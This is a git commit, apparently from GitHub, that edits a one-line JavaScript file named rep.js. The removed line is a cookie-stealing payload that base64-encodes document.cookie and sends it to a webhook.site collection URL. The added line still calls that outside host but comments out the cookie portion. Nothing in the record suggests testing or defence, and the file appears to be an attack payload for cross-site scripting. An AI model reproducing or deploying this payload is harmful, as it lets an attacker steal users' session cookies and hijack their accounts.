8704f73a302642025de4005e5acaebdb636a9b05
cacicjo <75219617+cacicjo@users.noreply.github.com>
2026-06-22 17:42:04 +0200

    Update rep.js

--- rep.js
+++ rep.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/5c2be0f5-e7e9-474c-82d0-dc49af23db1a?data='+btoa(document.cookie));
+fetch('https://webhook.site/5c2be0f5-e7e9-474c-82d0-dc49af23db1a?data=');//+btoa(document.cookie));
